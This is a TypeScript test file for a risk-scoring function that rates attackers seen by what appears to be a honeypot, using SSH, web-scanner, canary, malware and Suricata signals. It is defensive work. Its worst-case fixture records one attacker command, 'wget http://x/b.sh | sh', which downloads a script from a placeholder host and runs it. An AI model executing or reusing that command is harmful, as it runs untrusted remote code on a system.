import assert from 'node:assert/strict'
import { computeRiskScore } from './risk-score.js'
import type { RiskInput } from './risk-constants.js'

const BASE: RiskInput = {
  sshSessions: 0, sshAuthAttempts: 0, sshLoginSuccess: false, commands: [],
  webHits: 0, webAttackTypes: [], protocolsSeen: [],
  protocolAuthAttempts: 0, protocolCommandCount: 0, protocolConnectCount: 0,
  protocolUniquePorts: 0, credentialReuse: false, timeWindowMinutes: null,
}

const scan = { ...BASE, webHits: 1, webAttackTypes: ['scanner'], protocolsSeen: ['http'] }

// Volume must separate a single probe from a sustained campaign — the bug that
// made every web attacker read as MEDIUM regardless of size.
const campaign = { ...scan, webHits: 26_300, webAttackTypes: ['scanner', 'cmdi', 'lfi'] }
assert.ok(computeRiskScore(campaign).score > computeRiskScore(scan).score + 20)

// Evidence beats inference: one canary hit outweighs the whole volume signal,
// and on its own lifts a bare scanner by a full risk band.
const canary = { ...scan, canaryHits: 1 }
assert.equal(computeRiskScore(canary).breakdown.evidence, 40)
assert.ok(computeRiskScore(canary).breakdown.evidence > 12)
assert.equal(computeRiskScore(scan).level, 'INFO')
assert.equal(computeRiskScore(canary).level, 'MEDIUM')
// ...and it must survive the TOP_FACTORS_LIMIT cut, ahead of generic noise.
assert.ok(computeRiskScore(canary).topFactors[0].includes('Canary'))

// Suricata severity is inverted — 1 must score above 3.
const sev1 = { ...scan, suricataAlerts: 2, suricataWorstSeverity: 1 }
const sev3 = { ...scan, suricataAlerts: 2, suricataWorstSeverity: 3 }
assert.ok(computeRiskScore(sev1).breakdown.evidence > computeRiskScore(sev3).breakdown.evidence)

// Callers with no evidence data (threat-alerts.ts) must score as before.
assert.equal(computeRiskScore(scan).breakdown.evidence, 0)

// A full intrusion still saturates rather than overflowing.
const worst = {
  ...campaign, canaryHits: 5, malwareSamples: 3, suricataAlerts: 40, suricataWorstSeverity: 1,
  sshSessions: 10, sshAuthAttempts: 200, sshLoginSuccess: true, commands: ['wget http://x/b.sh | sh'],
}
assert.equal(computeRiskScore(worst).score, 100)
assert.equal(computeRiskScore(worst).level, 'CRITICAL')

console.log('risk-score: ok')
